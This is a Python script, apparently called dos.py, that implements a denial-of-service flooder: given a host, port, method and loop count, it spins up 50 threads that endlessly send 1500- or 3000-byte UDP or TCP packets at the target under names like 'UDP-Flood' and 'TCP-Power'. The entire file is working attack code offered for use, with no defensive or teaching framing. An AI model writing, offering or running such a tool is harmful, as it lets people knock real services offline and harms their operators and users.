import sys
import socket
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import Callable

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Attack:
    def __init__(self, host: str, port: int, method: str, loops: int):
        self.host = host
        self.port = port
        self.method = method
        self.loops = loops

    def _send_packet(self, socket_type: int, amplifier: int, protocol: str):
        try:
            with socket.socket(socket.AF_INET, socket_type) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((self.host, self.port))
                while True:
                    s.send(b"\x99" * amplifier)
                    logging.info(f"{protocol} packet sent to {self.host}:{self.port} with amplifier {amplifier}")
        except socket.error as e:
            logging.error(f"{protocol} Packet Error: {e}")

    def send_udp_packet(self, amplifier: int):
        self._send_packet(socket.SOCK_DGRAM, amplifier, "UDP")

    def send_tcp_packet(self, amplifier: int):
        self._send_packet(socket.SOCK_STREAM, amplifier, "TCP")

    def start_attack(self):
        method_map: dict[str, Callable[[int], None]] = {
            "UDP-Flood": lambda amp: self.send_udp_packet(amp),
            "UDP-Power": lambda amp: self.send_udp_packet(amp),
            "UDP-Mix": lambda amp: (self.send_udp_packet(1500), self.send_udp_packet(3000)),
            "TCP-Flood": lambda amp: self.send_tcp_packet(amp),
            "TCP-Power": lambda amp: self.send_tcp_packet(amp),
            "TCP-Mix": lambda amp: (self.send_tcp_packet(1500), self.send_tcp_packet(3000)),
        }

        amplifier_map = {
            "UDP-Flood": 1500,
            "UDP-Power": 3000,
            "TCP-Flood": 1500,
            "TCP-Power": 3000,
        }

        if self.method not in method_map:
            logging.error("Unknown attack method specified.")
            return

        with ThreadPoolExecutor(max_workers=50) as executor:
            for _ in range(self.loops):
                if self.method in amplifier_map:
                    executor.submit(method_map[self.method], amplifier_map[self.method])
                else:
                    executor.submit(method_map[self.method], None)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        logging.error("Usage: dos.py <host> <port> <method> <loops>")
        sys.exit(1)

    host = str(sys.argv[1])
    port = int(sys.argv[2])
    method = str(sys.argv[3])
    loops = int(sys.argv[4])

    attack = Attack(host, port, method, loops)
    attack.start_attack()
